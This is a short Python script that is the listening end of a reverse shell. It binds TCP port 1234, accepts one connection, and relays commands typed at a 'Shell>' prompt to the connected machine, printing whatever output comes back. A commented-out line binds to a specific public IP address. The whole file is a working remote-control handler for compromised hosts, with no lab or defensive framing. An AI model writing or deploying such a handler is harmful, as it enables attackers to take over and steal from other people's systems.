import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 1234))
# s.bind(('42.116.117.214', 1234))
s.listen(1)
print("[*] Listening on port 1234...")

conn, addr = s.accept()
print(f"[*] Connected by {addr}")

while True:
    command = input("Shell> ")
    if command.lower() == "exit":
        break
    
    conn.send(command.encode() + b"\n")
    # Receive the response
    print(conn.recv(4096).decode(errors='replace'))

conn.close()